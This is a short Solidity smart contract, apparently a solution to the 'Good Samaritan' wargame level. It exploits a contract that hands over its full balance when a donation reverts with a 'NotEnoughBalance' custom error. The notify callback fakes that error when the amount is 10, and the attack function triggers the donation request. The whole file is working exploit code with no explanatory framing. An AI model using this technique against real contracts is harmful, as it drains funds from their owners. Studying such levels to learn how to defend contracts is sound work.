// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IGoodSamaritan {
    function requestDonation() external returns (bool);
}

contract AttackGoodSamaritan {
    error NotEnoughBalance();

    function notify(uint256 amount) external {
        if (amount == 10){
            revert NotEnoughBalance();
        }
        
    }

    function attack(address target) external {
        IGoodSamaritan(target).requestDonation();
    }
}
